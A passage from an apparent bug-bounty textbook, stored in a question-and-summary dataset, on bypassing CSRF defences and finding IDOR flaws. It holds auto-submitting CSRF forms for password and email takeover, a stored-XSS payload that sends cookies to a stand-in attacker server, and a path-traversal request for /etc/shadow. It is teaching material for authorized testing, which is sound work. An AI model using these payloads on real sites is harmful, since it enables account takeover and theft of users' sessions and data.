into executing the state-\nchanging action. Refer to Chapter 8 to learn how this attack works.\nChange the Request Method\nAnother trick you can use to bypass CSRF protections is changing the request\nmethod. Sometimes sites will accept multiple request methods for the same\nendpoint, but protection might not be in place for each of those methods. By\nchanging the request method, you might be able to get the action executed\nwithout encountering CSRF protection.\nFor example, say the POST request of the password-change endpoint is\nprotected by a CSRF token, like this:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\n(POST request body)\nnew_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b\nYou can try to send the same request as a GET request and see if you\ncan get away with not providing a CSRF token:\nGET /password_change?new_password=abc123\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\nIn this case, your malicious HTML page could simply look like this:\n<html>\n<img src=\"https://email.example.com/password_change?new_password=abc123\"/>\n</html>\n164 Chapter 9\nThe HTML <img> tag loads images from external sources. It will send a\nGET request to the URL specified in its src attribute.\nIf the password change occurs after you load this HTML page, you can\nconfirm that the endpoint is vulnerable to CSRF via a GET request. On the\nother hand, if the original action normally uses a GET request, you can try\nconverting it into a POST request instead.\nBypass CSRF Tokens Stored on the Server\nBut what if neither clickjacking nor changing the request method works? If\nthe site implements CSRF protection via tokens, here are a few more things\nthat you can try.\nJust because a site uses CSRF tokens doesn’t mean it is validating them\nproperly. If the site isn’t validating CSRF tokens in the right way, you can\nstill achieve CSRF with a few modifications of your malicious HTML page.\nFirst, try deleting the token parameter or sending a blank token param-\neter. For example, this will send the request without a csrf_token parameter:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\n(POST request body)\nnew_password=abc123\nYou can generate this request with an HTML form like this:\n<html>\n<form method=\"POST\" action=\"https://email.example.com/password_change\" id=\"csrf-form\">\n<input type=\"text\" name=\"new_password\" value=\"abc123\">\n<input type='submit' value=\"Submit\">\n</form>\n<script>document.getElementById(\"csrf-form\").submit();</script>\n</html>\nThis next request will send a blank csrf_token parameter:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\n(POST request body)\nnew_password=abc123&csrf_token=\nYou can generate a payload like this by using an HTML form like the\nfollowing:\n<html>\n<form method=\"POST\" action=\"https://email.example.com/password_change\" id\"csrf-form\">\n<input type=\"text\" name=\"new_password\" value=\"abc123\">\n<input type=\"text\" name=\"csrf_token\" value=\"\">\n<input type='submit' value=\"Submit\">\nCross-Site Request Forgery 165\n</form>\n<script>document.getElementById(\"csrf-form\").submit();</script>\n</html>\nDeleting the token parameter or sending a blank token often works\nbecause of a common application logic mistake. Applications sometimes\ncheck the validity of the token only if the token exists, or if the token\nparameter is not blank. The code for an insecure application’s validation\nmechanism might look roughly like this:\ndef validate_token():\n1 if (request.csrf_token == session.csrf_token):\npass\nelse:\n2 throw_error(\"CSRF token incorrect. Request rejected.\")\n[...]\ndef process_state_changing_action():\nif request.csrf_token:\nvalidate_token()\n3 execute_action()\nThis fragment of Python code first checks whether the CSRF token\nexists 1. If it exists, the code will proceed to validate the token. If the token\nis valid, the code will continue. If the token is invalid, the code will stop the\nexecution and produce an error 2. On the other hand, if the token does not\nexist, the code will skip validation and jump to executing the action right\naway 3. In this case, sending a request without the token, or a blank value as\nthe token, may mean the server won’t attempt to validate the token at all.\nYou can also try submitting the request with another session’s CSRF token.\nThis works because some applications might check only whether the token\nis valid, without confirming that it belongs to the current user. Let’s say the\nvictim’s token is 871caef0757a4ac9691aceb9aad8b65b, and yours is YOUR_TOKEN. Even\nthough it’s hard to get the victim’s token, you can obtain your own token eas-\nily, so try providing your own token in the place of the legitimate token. You\ncan also create another test account to generate tokens if you don’t want to\nuse your own tokens. For example, your exploit code might look like this:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE\n(POST request body)\nnew_password=abc123&csrf_token=YOUR_TOKEN\nThe faulty application logic might look something like this:\ndef validate_token():\nif request.csrf_token:\n1 if (request.csrf_token in valid_csrf_tokens):\npass\n166 Chapter 9\nelse:\nthrow_error(\"CSRF token incorrect. Request rejected.\")\n[...]\ndef process_state_changing_action():\nvalidate_token()\n2 execute_action()\nThe Python code here first validates the CSRF token. If the token is in\na list of current valid tokens 1, execution continues and the state-changing\naction is executed 2. Otherwise, an error is generated and execution halts.\nIf this is the case, you can insert your own CSRF token into the malicious\nrequest!\nBypass Double-Submit CSRF Tokens\nSites also commonly use a double-submit cookie as a defense against CSRF. In\nthis technique, the state-changing request contains the same random token\nas both a cookie and a request parameter, and the server checks whether\nthe two values are equal. If the values match, the request is seen as legiti-\nmate. Otherwise, the application rejects it. For example, this request would\nbe deemed valid, because the csrf_token in the user’s cookies matches the\ncsrf_token in the POST request parameter:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=871caef0757a4ac9691aceb9aad8b65b\n(POST request body)\nnew_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b\nAnd the following one would fail. Notice that the csrf_token in the\nuser’s cookies is different from the csrf_token in the POST request param-\neter. In a double-submit token validation system, it does not matter whether\nthe tokens themselves are valid. The server checks only whether the token\nin the cookies is the same as the token in the request parameters:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=1aceb9aad8b65b871caef0757a4ac969\n(POST request body)\nnew_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b\nIf the application uses double-submit cookies as its CSRF defense mech-\nanism, it’s probably not keeping records of the valid token server-side. If the\nserver were keeping records of the CSRF token server-side, it could simply\nvalidate the token when it was sent over, and the application would not need\nto use double-submit cookies in the first place.\nCross-Site Request Forgery 167\nThe server has no way of knowing if any token it receives is actually\nlegitimate; it’s merely checking that the token in the cookie and the token\nin the request body is the same. In other words, this request, which enters\nthe same bogus value as both the cookie and request parameter, would also\nbe seen as legitimate:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token\n(POST request body)\nnew_password=abc123&csrf_token=not_a_real_token\nGenerally, you shouldn’t have the power to change another user’s cook-\nies. But if you can find a way to make the victim’s browser send along a fake\ncookie, you’ll be able to execute the CSRF.\nThe attack would then consist of two steps: first, you’d use a session-\nfixation technique to make the victim’s browser store whatever value you\nchoose as the CSRF token cookie. Session fixation is an attack that allows\nattackers to select the session cookies of the victim. We do not cover session\nfixations in this book, but you can read about them on Wikipedia (https://\nen.wikipedia.org/wiki/Session_fixation). Then, you’d execute the CSRF with\nthe same CSRF token that you chose as the cookie.\nBypass CSRF Referer Header Check\nWhat if your target site isn’t using CSRF tokens but checking the referer\nheader instead? The server might verify that the referer header sent with\nthe state-changing request is a part of the website’s allowlisted domains. If it\nis, the site would execute the request. Otherwise, it would deem the request\nto be fake and reject it. What can you do to bypass this type of protection?\nFirst, you can try to remove the referer header. Like sending a blank\ntoken, sometimes all you need to do to bypass a referer check is to not send\na referer at all. To remove the referer header, add a <meta> tag to the page\nhosting your request form:\n<html>\n<meta name=\"referrer\" content=\"no-referrer\">\n<form method=\"POST\" action=\"https://email.example.com/password_change\" id=\"csrf-form\">\n<input type=\"text\" name=\"new_password\" value=\"abc123\">\n<input type='submit' value=\"Submit\">\n</form>\n<script>document.getElementById(\"csrf-form\").submit();</script>\n</html>\nThis particular <meta> tag tells the browser to not include a referer\nheader in the resulting HTTP request.\nThe faulty application logic might look like this:\ndef validate_referer():\nif (request.referer in allowlisted_domains):\n168 Chapter 9\npass\nelse:\nthrow_error(\"Referer incorrect. Request rejected.\")\n[...]\ndef process_state_changing_action():\nif request.referer:\nvalidate_referer()\nexecute_action()\nSince the application validates the referer header only if it exists, you’ve\nsuccessfully bypassed the website’s CSRF protection just by making the vic-\ntim’s browser omit the referer header!\nYou can also try to bypass the logic check used to validate the referer\nURL. Let’s say the application looks for the string \"example.com\" in the ref-\nerer URL, and if the referer URL contains that string, the application treats\nthe request as legitimate. Otherwise, it rejects the request:\ndef validate_referer():\nif request.referer:\nif (\"example.com\" in request.referer):\npass\nelse:\nthrow_error(\"Referer incorrect. Request rejected.\")\n[...]\ndef process_state_changing_action():\nvalidate_referer()\nexecute_action()\nIn this case, you can bypass the referer check by placing the victim\ndomain name in the referer URL as a subdomain. You can achieve this by\ncreating a subdomain named after the victim’s domain, and then hosting\nthe malicious HTML on that subdomain. Your request would look like this:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\nReferer: example.com.attacker.com\n(POST request body)\nnew_password=abc123\nYou can also try placing the victim domain name in the referer URL as\na pathname. You can do so by creating a file with the name of the target’s\ndomain and hosting your HTML page there:\nPOST /password_change\nHost: email.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\nReferer: attacker.com/example.com\nCross-Site Request Forgery 169\n(POST request body)\nnew_password=abc123\nAfter you’ve uploaded your HTML page at the correct location, load\nthat page and see if the state-changing action was executed.\nBypass CSRF Protection by Using XSS\nIn addition, as I mentioned in Chapter 6, any XSS vulnerability will defeat\nCSRF protections, because XSS will allow attackers to steal the legitimate\nCSRF token and then craft forged requests by using XMLHttpRequest. Often,\nattackers will find XSS as the starting point to launch CSRFs to take over\nadmin accounts.\nEscalating the Attack\nAfter you’ve found a CSRF vulnerability, don’t just report it right away! Here\nare a few ways you can escalate CSRFs into severe security issues to maxi-\nmize the impact of your report. Often, you need to use a combination of\nCSRF and other minor design flaws to discover these.\nLeak User Information by Using CSRF\nCSRF can sometimes cause information leaks as a side effect. Applications\noften send or disclose information according to user preferences. If you can\nchange these settings via CSRF, you can pave the way for sensitive informa-\ntion disclosures.\nFor example, let’s say the example.com web application sends monthly\nbilling emails to a user-designated email address. These emails contain the\nusers’ billing information, including street addresses, phone numbers, and\ncredit card information. The email address to which these billing emails\nare sent can be changed via the following request:\nPOST /change_billing_email\nHost: example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\n(POST request body)\nemail=NEW_EMAIL&csrf_token=871caef0757a4ac9691aceb9aad8b65b\nUnfortunately, the CSRF validation on this endpoint is broken, and\nthe server accepts a blank token. The request would succeed even if the\ncsrf_token field is left empty:\nPOST /change_billing_email\nHost: example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\n(POST request body)\nemail=NEW_EMAIL&csrf_token=\n170 Chapter 9\nAn attacker could make a victim user send this request via CSRF to\nchange the destination of their billing emails:\nPOST /change_billing_email\nHost: example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\n(POST request body)\nemail=ATTACKER_EMAIL&csrf_token=\nAll future billing emails would then be sent to the attacker’s email\naddress until the victim notices the unauthorized change. Once the billing\nemail is sent to the attacker’s email address, the attacker can collect sensi-\ntive information, such as street addresses, phone numbers, and credit card\ninformation associated with the account.\nCreate Stored Self-XSS by Using CSRF\nRemember from Chapter 6 that self-XSS is a kind of XSS attack that requires\nthe victim to input the XSS payload. These vulnerabilities are almost always\nconsidered a nonissue because they’re too difficult to exploit; doing so\nrequires a lot of action from the victim’s part, and thus you’re unlikely to suc-\nceed. However, when you combine CSRF with self-XSS, you can often turn\nthe self-XSS into stored XSS.\nFor example, let’s say that example.com’s financial subdomain, finance\n.example.com, gives users the ability to create nicknames for each of their\nlinked bank accounts. The account nickname field is vulnerable to self-XSS:\nthere is no sanitization, validation, or escaping for user input on the field.\nHowever, only the user can edit and see this field, so there is no way for an\nattacker to trigger the XSS directly.\nHowever, the endpoint used to change the account nicknames is vul-\nnerable to CSRF. The application doesn’t properly validate the existence of\nthe CSRF token, so simply omitting the token parameter in the request will\nbypass CSRF protection. For example, this request would fail, because it\ncontains the wrong token:\nPOST /change_account_nickname\nHost: finance.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\n(POST request body)\naccount=0\n&nickname=\"<script>document.location='http://attacker_server_ip/\ncookie_stealer.php?c='+document.cookie;</script>\"\n&csrf_token=WRONG_TOKEN\nBut this request, with no token at all, would succeed:\nPOST /change_account_nickname\nHost: finance.example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\nCross-Site Request Forgery 171\n(POST request body)\naccount=0\n&nickname=\"<script>document.location='http://attacker_server_ip/\ncookie_stealer.php?c='+document.cookie;</script>\"\nThis request will change the user’s account nickname and store the\nXSS payload there. The next time a user logs into the account and views\ntheir dashboard, they’ll trigger the XSS.\nTake Over User Accounts by Using CSRF\nSometimes CSRF can even lead to account takeover. These situations aren’t\nuncommon, either; account takeover issues occur when a CSRF vulner-\nability exists in critical functionality, like the code that creates a password,\nchanges the password, changes the email address, or resets the password.\nFor example, let’s say that in addition to signing up by using an email\naddress and password, example.com also allows users to sign up via their\nsocial media accounts. If a user chooses this option, they’re not required to\ncreate a password, as they can simply log in via their linked account. But to\ngive users another option, those who’ve signed up via social media can set a\nnew password via the following request:\nPOST /set_password\nHost: example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\n(POST request body)\npassword=XXXXX&csrf_token=871caef0757a4ac9691aceb9aad8b65b\nSince the user signed up via their social media account, they don’t need\nto provide an old password to set the new password, so if CSRF protection\nfails on this endpoint, an attacker would have the ability to set a password for\nanyone who signed up via their social media account and hasn’t yet done so.\nLet’s say the application doesn’t validate the CSRF token properly and\naccepts an empty value. The following request will set a password for any-\none who doesn’t already have one set:\nPOST /set_password\nHost: example.com\nCookie: session_cookie=YOUR_SESSION_COOKIE;\n(POST request body)\npassword=XXXXX&csrf_token=\nNow all an attacker has to do is to post a link to this HTML page on\npages frequented by users of the site, and they can automatically assign the\npassword of any user who visits the malicious page:\n<html>\n<form method=\"POST\" action=\"https://email.example.com/set_password\" id=\"csrf-form\">\n<input type=\"text\" name=\"new_password\" value=\"this_account_is_now_mine\">\n172 Chapter 9\n<input type=\"text\" name=\"csrf_token\" value=\"\">\n<input type='submit' value=\"Submit\">\n</form>\n<script>document.getElementById(\"csrf-form\").submit();</script>\n</html>\nAfter that, the attacker is free to log in as any of the affected victims\nwith the newly assigned password this_account_is_now_mine.\nWhile the majority of CSRFs that I have encountered were low-severity\nissues, sometimes a CSRF on a critical endpoint can lead to severe\nconsequences.\nDelivering the CSRF Payload\nQuite often in bug bounty reports, you’ll need to show companies that\nattackers can reliably deliver a CSRF payload. What options do attackers\nhave to do so?\nThe first and simplest option of delivering a CSRF payload is to trick\nusers into visiting an external malicious site. For example, let’s say example.com\nhas a forum that users frequent. In this case, attackers can post a link like this\non the forum to encourage users to visit their page:\nVisit this page to get a discount on your example.com subscription:\nhttps://example.attacker.com\nAnd on example.attacker.com, the attacker can host an auto-submitting\nform to execute the CSRF:\n<html>\n<form method=\"POST\" action=\"https://email.example.com/set_password\" id=\"csrf-form\">\n<input type=\"text\" name=\"new_password\" value=\"this_account_is_now_mine\">\n<input type='submit' value=\"Submit\">\n</form>\n<script>document.getElementById(\"csrf-form\").submit();</script>\n</html>\nFor CSRFs that you could execute via a GET request, attackers can often\nembed the request as an image directly—for example, as an image posted to\na forum. This way, any user who views the forum page would be affected:\n<img src=\"https://email.example.com/set_password?new_password=this_account_is_now_mine\">\nFinally, attackers can deliver a CSRF payload to a large audience by\nexploiting stored XSS. If the forum comment field suffers from this vul-\nnerability, an attacker can submit a stored-XSS payload there to make any\nforum visitor execute the attacker’s malicious script. In the malicious script,\nthe attacker can include code that sends the CSRF payload:\n<script>\ndocument.body.innerHTML += \"\n<form method=\"POST\" action=\"https://email.example.com/set_password\" id=\"csrf-form\">\nCross-Site Request Forgery 173\n<input type=\"text\" name=\"new_password\" value=\"this_account_is_now_mine\">\n<input type='submit' value=\"Submit\">\n</form>\";\ndocument.getElementById(\"csrf-form\").submit();\n</script>\nThis piece of JavaScript code adds our exploit form to the user’s cur-\nrent page and then auto-submits that form.\nUsing these delivery methods, you can show companies how attackers\ncan realistically attack many users and demonstrate the maximum impact\nof your CSRF vulnerability. If you have Burp Suite Pro, or use the ZAP\nproxy, you can also take advantage of their CSRF POC-generation function-\nality. For more information, search the tools’ documentation for CSRF POC\ngeneration. You can also keep a POC script you wrote yourself and insert a\ntarget site’s URLs into the script every time you test a new target.\nFinding Your First CSRF!\nArmed with this knowledge about CSRF bugs, bypassing CSRF protection,\nand escalating CSRF vulnerabilities, you’re now ready to look for your first\nCSRF vulnerability! Hop on a bug bounty program and find your first CSRF\nby following the steps covered in this chapter:\n1. Spot the state-changing actions on the application and keep a note on\ntheir locations and functionality.\n2. Check these functionalities for CSRF protection. If you can’t spot any\nprotections, you might have found a vulnerability!\n3. If any CSRF protection mechanisms are present, try to bypass the pro-\ntection by using the protection-bypass techniques mentioned in this\nchapter.\n4. Confirm the vulnerability by crafting a malicious HTML page and visit-\ning that page to see if the action has executed.\n5. Think of strategies for delivering your payload to end users.\n6. Draft your first CSRF report!\n174 Chapter 9",
    "question": "What is Cross-Site Request Forgery (CSRF) and how can it be prevented?",
    "summary": "Cross-site request forgery (CSRF) is a technique where an attacker tricks a user into performing unwanted actions on a website they are authenticated to. This happens because the website relies on session cookies to authenticate users, and attackers can exploit this by sending forged requests that include the user's session cookie. To prevent CSRF, websites can use CSRF tokens or SameSite cookies, which help ensure that requests originate from the legitimate site. Attackers can bypass CSRF protections by using various methods, such as clickjacking, changing request methods, or exploiting XSS vulnerabilities. Once a CSRF vulnerability is found, it can be escalated to cause more severe issues, like account takeovers or information leaks."
  },
  {
    "start": 122,
    "end": 131,
    "text": "10\nINSECURE DIRECT\nOBJECT REFERENCES\nLike XSS and open redirects, insecure direct\nobject references (IDORs) are a type of bug\npresent in almost every web application.\nThey happen when the application grants\ndirect access to a resource based on the user’s request,\nwithout validation.\nIn this chapter, we’ll explore how these work. Then we’ll dive into how\napplications prevent IDORs, and how you can bypass those common protec-\ntion mechanisms.\nMechanisms\nDespite its long and intimidating name, IDOR is easy to understand; it’s\nessentially a missing access control. IDORs happen when users can access\nresources that do not belong to them by directly referencing the object ID,\nobject number, or filename.\nFor example, let’s say that example.com is a social media site that allows\nyou to chat with others. When you sign up, you notice that your user ID on\nthe site is 1234. This website allows you to view all your messages with your\nfriends by clicking the View Your Messages button located on the home\npage. When you click that button, you get redirected to this location, which\ndisplays all your direct messages: https://example.com/messages?user_id=1234.\nNow, what if you change the URL in the URL bar to https://example.com/\nmessages?user_id=1233?\nYou notice that you can now see all the private messages between another\nuser, user 1233, and their friends. At this point, you’ve found an IDOR vul-\nnerability. The application does not restrict access to messages based on the\nuser’s identity. Instead, it allows users to request any messages that they wish.\nThe application naively trusts user input, and it directly loads resources based\non the user-provided user_id value, like this piece of example code:\nmessages = load_messages(request.user_id)\ndisplay_messages(messages)\nIDORs are not just limited to reading other users’ information, either.\nYou can also use them to edit data on another user’s behalf. For example,\nlet’s say that users can submit a POST request to change their password.\nThe POST request must contain that user’s ID and new password, and they\nmust direct the request to the /change_password endpoint:\nPOST /change_password\n(POST request body)\nuser_id=1234&new_password=12345\nIn this case, if the application doesn’t validate that the submitted user\nID corresponds to the currently logged-in user, an attacker might be able to\nchange someone else’s password by sending a user ID that doesn’t belong to\nthem, like this:\nPOST /change_password\n(POST request body)\nuser_id=1233&new_password=12345\nFinally, IDORs can affect resources other than database objects. Another\ntype of IDOR happens when applications reference a system file directly. For\nexample, this request allows users to access a file they’ve uploaded: https://\nexample.com/uploads?file=user1234-01.jpeg.\nSince the value of the file parameter is user1234–01.jpeg, we can\neasily deduce that user-uploaded files follow the naming convention of\nUSER_ID-FILE_NUMBER.FILE_EXTENSION. Therefore, another user’s uploaded files\nmight be named user1233–01.jpeg. If the application doesn’t restrict users’\n176 Chapter 10\naccess to files that belong to others, an attacker could access anyone’s\nuploaded files by guessing the filenames, like this: https://example.com/\nuploads?file=user1233-01.jpeg.\nA malicious user might even be able to read sensitive system files through\nthis endpoint! For instance, /etc/shadow is a file on Unix systems used to keep\ntrack of user passwords. Because it is sensitive, it should not be exposed to\nregular users. If you can read the file this way, through a URL like https://\nexample.com/uploads?file=/PATH/TO/etc/shadow, then you’ve found a vulnerabil-\nity! Attackers being able to read files outside the web root folder is also known\nas a path traversal attack, or directory traversal attack. We will talk more about\ndirectory traversal attacks in Chapter 17.\nPrevention\nIDORs happen when an application fails at two things. First, it fails to\nimplement access control based on user identity. Second, it fails to randomize\nobject IDs and instead keeps references to data objects, like a file or a database\nentry, predictable.\nIn this chapter’s first example, you were able to see messages belonging\nto user 1233 because the server didn’t check the logged-in user’s identity\nbefore sending private info. The server wasn’t verifying that you were, in\nfact, user 1233. It simply returned the information you asked for.\nIn this case, since user IDs are simply numbers, it’s easy to infer that\nyou can also retrieve the messages for user 1232 and user 1231, like so:\nhttps://example.com/messages?user_id=1232\nhttps://example.com/messages?user_id=1231\nThis is why the vulnerability is called an insecure direct object reference.\nThe user’s ID is used to directly reference the user’s private messages on\nthis site. If not secured by proper access control, these predictable direct\nobject references expose the data hidden behind them, allowing anyone to\ngrab the information associated with the reference.\nApplications can prevent IDORs in two ways. First, the application can\ncheck the user’s identity and permissions before granting access to a resource.\nFor example, the application can check if the user’s session cookies corre-\nspond to the user_id whose messages the user is requesting.\nSecond, the website can use a unique, unpredictable key or a hashed\nidentifier to reference each user’s resources. Hashing refers to the one-way\nprocess that transforms a value into another string. Hashing IDs with a\nsecure algorithm and a secret key makes it difficult for attackers to guess the\nhashed ID strings. If example.com structured its requests as follows, attackers\nwould no longer be able to access other users’ messages, since there would\nbe no way for an attacker to guess such a long, random user_key value:\nhttps://example.com/messages?user_key=6MT9EalV9F7r9pns0mK1eDAEW\nInsecure Direct Object References 177\nBut this method isn’t a complete protection against IDORs. Attackers can\nstill leak user information if they can find a way to steal these URLs or user\n_keys. The best way to protect against IDORs is fine-grained access control, or\na combination of access control and randomization or hashing of IDs.\nHunting for IDORs\nLet’s hunt for some IDORs! The best way to discover IDORs is through a\nsource code review that checks if all direct object references are protected\nby access control. We’ll talk about how to conduct source code reviews in\nChapter 22. But if you cannot access the application’s source code, here’s a\nsimple and effective way to test for IDORs.\nStep 1: Create Two Accounts\nFirst, create two different accounts on the target website. If users can have\ndifferent permissions on the site, create two accounts for each permission\nlevel. For example, create two admin accounts, two regular user accounts,\ntwo group member accounts, and two non-group-member accounts. This\nwill help you test for access control issues among similar user accounts, as\nwell as across users with different privileges.\nContinuing the previous example, you could create two accounts on\nexample.com: user 1235 and user 1236. One of the accounts would serve as\nyour attacker account, used to carry out the IDOR attacks. The other would\nbe the victim account used to observe the effects of the attack. The message\npages for the two users would have the following URLS:\nhttps://example.com/messages?user_id=1235 (Attacker)\nhttps://example.com/messages?user_id=1236 (Victim)\nIf the application doesn’t allow you to create so many accounts, you\ncould reach out to the company and ask for more accounts. Companies will\noften grant you extra accounts if you explain that you’re participating in\ntheir bug bounty program. Also, if the application has paid memberships,\nask the company for a premium account or pay for one yourself. Quite\noften, paying for these memberships is worth it, because you gain access to\nnew features to test.\nIn addition to testing with two accounts, you should also repeat the test-\ning procedure without signing in. See if you can use an unauthenticated\nsession to access the information or functionalities made available to legiti-\nmate users.\nStep 2: Discover Features\nNext, try to discover as many application features as possible. Use the highest-\nprivileged account you own and go through the application, looking for\napplication features to test.\n178 Chapter 10\nPay special attention to functionalities that return user information or\nmodify user data. Note them for future reference. Here are some features\nthat might have IDORs on example.com:\nThis endpoint lets you read user messages:\nhttps://example.com/messages?user_id=1236\nThis one lets you read user files:\nhttps://example.com/uploads?file=user1236-01.jpeg\nThis endpoint deletes user messages:\nPOST /delete_message\n(POST request body)\nmessage_id=user1236-0111\nThis one is for accessing group files:\nhttps://example.com/group_files?group=group3\nThis one deletes a group:\nPOST /delete_group\n(POST request body)\ngroup=group3\nStep 3: Capture Requests\nBrowse through each application feature you mapped in the preceding step\nand capture all the requests going from your web client to the server. Inspect\neach request carefully and find the parameters that contain numbers, user-\nnames, or IDs. Remember that you can trigger IDORs from different locations\nwithin a request, like URL parameters, form fields, filepaths, headers, and\ncookies.\nTo make testing more efficient, use two browsers, and log into a dif-\nferent account in each. Then manipulate the requests coming from one\nbrowser to see if the change is immediately reflected on the other account.\nFor example, let’s say you create two accounts, 1235 and 1236. Log into 1235\nin Firefox and 1236 in Chrome.\nUse Burp to modify the traffic coming from Firefox. Turn on Intercept\nin the Proxy tab and edit requests in the proxy text window (Figure 10-1).\nCheck if your attack has succeeded by observing the changes reflected on\nthe victim account in Chrome.\nAlso, note that APIs like Representational State Transfer (REST) and\nGraphQL are often found to be vulnerable to IDOR too. We will talk more\nabout hacking APIs in Chapter 24. Be on the lookout for these endpoints.\nYou can use the recon techniques from Chapter 5 to discover additional\nendpoints. Then follow this testing methodology to switch out IDs found in\nthose endpoints as well.\nInsecure Direct Object References 179\nFigure 10-1: Modify the request in Burp’s proxy window to switch out the IDs.\nStep 4: Change the IDs\nFinally, switch the IDs in the sensitive requests and check if the information\nreturned also changes. See if you can access the victim account’s informa-\ntion by using the attacker account. And check if you can modify the second\nuser’s account from the first.\nFor example, in this setup, you can try to access the functionalities that\nuser 1236 has access to via your Firefox browser:\nThis endpoint lets you read user messages:\nhttps://example.com/messages?user_id=1236\nThis one lets you read user files:\nhttps://example.com/uploads?file=user1236-01.jpeg\nThis endpoint deletes user messages:\nPOST /delete_message\n(POST request body)\nmessage_id=user1236-0111\nThis one is for accessing group files:\nhttps://example.com/group_files?group=group3\nThis endpoint deletes a group:\nPOST /delete_group\n(POST request body)\ngroup=group3\n180 Chapter 10\nIf any of these requests succeed in accessing or modifying user 1236’s\ninformation, you’ve found an IDOR vulnerability.\nBypassing IDOR Protection\nIDORs aren’t always as simple as switching out a numeric ID. As applications\nbecome more functionally complex, the way they reference resources also\noften becomes more complex. Modern web applications have also begun\nimplementing more protection against IDORs, and many now use more com-\nplex ID formats. This means that simple, numeric IDORs are becoming rarer.\nHow do we bypass these obstacles and find IDORs anyway?\nIDORs can manifest in applications in different ways. Here are a few\nplaces to pay attention to, beyond your plain old numeric IDs.\nEncoded IDs and Hashed IDs\nFirst, don’t ignore encoded and hashed IDs. When faced with a seemingly\nrandom string, always suspect that it is encoded and try to decode it. You\nshould also learn to recognize the most common encoding schemes, like\nbase64, URL encoding, and base64url. For example, take a look at the IDs\nof this endpoint:\nhttps://example.com/messages?user_id=MTIzNQ\nhttps://example.com/messages?user_id=MTIzNg\nThese user_ids are just the base64url-encoded version of a user’s ID.\nMTIzNQ is the base64url-encoded string of 1235, and MTIzNg is the encoded\nversion of 1236. Some applications use encoding schemes that you can eas-\nily reverse. In this case, you can simply encode your false IDs by using an\nonline base64url encoder and executing the IDOR.\nYou might not be able to tell which encoding scheme the site is using at\nfirst. In this case, use the Smart Decode tool (Figure 10-2) in Burp’s decoder,\nor simply try to decode the string with different schemes (URL encoding,\nHTML encoding, hex encoding, octal encoding, base64, base64url, and so\non) to figure out the encoding scheme in use. Once you gain more experi-\nence reading encoded data, you’ll develop an intuition for knowing the\nencoding scheme.\nFigure 10-2: You can try to use different methods to decode a string in Burp’s decoder. Or you can use the\nSmart Decode tool and see if Burp can detect the encoding scheme.\nInsecure Direct Object References 181\nIf the application is using a hashed or randomized ID, see if the ID is\npredictable. Sometimes applications use algorithms that produce insuffi-\ncient entropy. Entropy is the degree of randomness of the ID. The higher the\nentropy of a string, the harder it is to guess. Some IDs don’t have sufficient\nentropy and can be predicted after careful analysis. In this case, try creat-\ning a few accounts to analyze how these IDs are created. You might be able\nto find a pattern that will allow you to predict IDs belonging to other users.\nLeaked IDs\nIt might also be possible that the application leaks IDs via another API end-\npoint or other public pages of the application, like the profile page of a user.\nI once found an API endpoint that allowed users to retrieve detailed direct\nmessages through a hashed conversation_id value. The request looks like this:\nGET /messages?conversation_id=O1SUR7GJ43HS93VAR8xxxx\nThis seems safe at first glance, since the conversation_id is a long, random,\nalphanumeric sequence. But I later found that anyone could request a list of\nconversation_ids for each user, just by using their public user ID! The follow-\ning request would return a list of conversation_ids belonging to that user:\nGET /messages?user_id=1236\nSince the user_id is publicly available on each user’s profile page, I could\nread any user’s messages by first obtaining their user_id on their profile page,\nretrieving a list of conversation_ids belonging to that user, and finally loading\nthe messages via their conversation_ids.\nOffer the Application an ID, Even If It Doesn’t Ask for One\nIn modern web applications, you’ll commonly encounter scenarios in which\nthe application uses cookies instead of IDs to identify the resources a user\ncan access.\nFor example, when you send the following GET request to an endpoint,\nthe application will deduce your identity based on your session cookie, and\nthen send you the messages associated with that user:\nGET /api_v1/messages\nHost: example.com\nCookies: session=YOUR_SESSION_COOKIE\nSince you don’t know another user’s session cookies, you cannot use\nthose session cookies to read their messages. This might make it seem like\nthe application is safe from IDORs. But some applications will implement\nan alternative way of retrieving resources, using object IDs. They sometimes\ndo this for the convenience of the developers, for backward compatibility,\nor just because developers forgot to remove a test feature.\n182 Chapter 10\nIf no IDs exist in the application-generated request, try adding one to the\nrequest. Append id, user_id, message_id, or other object references to the URL\nquery, or the POST body parameters, and see if it makes a difference to the\napplication’s behavior. For example, say this request displays your messages:\nGET /api_v1/messages\nThen maybe this request would display another user’s messages instead:\nGET /api_v1/messages?user_id=ANOTHER_USERS_ID\nKeep an Eye Out for Blind IDORs\nStill, sometimes endpoints susceptible to IDOR don’t respond with the\nleaked information directly. They might lead the application to leak infor-\nmation elsewhere, instead: in export files, email, and maybe even in text\nalerts. For example, imagine that this endpoint on example.com allows users\nto email themselves a copy of a receipt:\nPOST /get_receipt\n(POST request body)\nreceipt_id=3001\nThis request will send a copy of receipt 3001 to the registered email of\nthe current user. Now, what if you were to request a receipt that belongs to\nanother user, receipt 2983?\nPOST /get_receipt\n(POST request body)\nreceipt_id=2983\nWhile the HTTP response does not change, you may get a copy of\nreceipt 2983 in your email inbox! Often a malicious request can cause an\ninfo leak sometime in the future. I once found an IDOR that led to an info\nleak one month later, in a monthly report.\nChange the Request Method\nIf one HTTP request method doesn’t work, you can try plenty of others instead:\nGET, POST, PUT, DELETE, PATCH, and so on. Applications 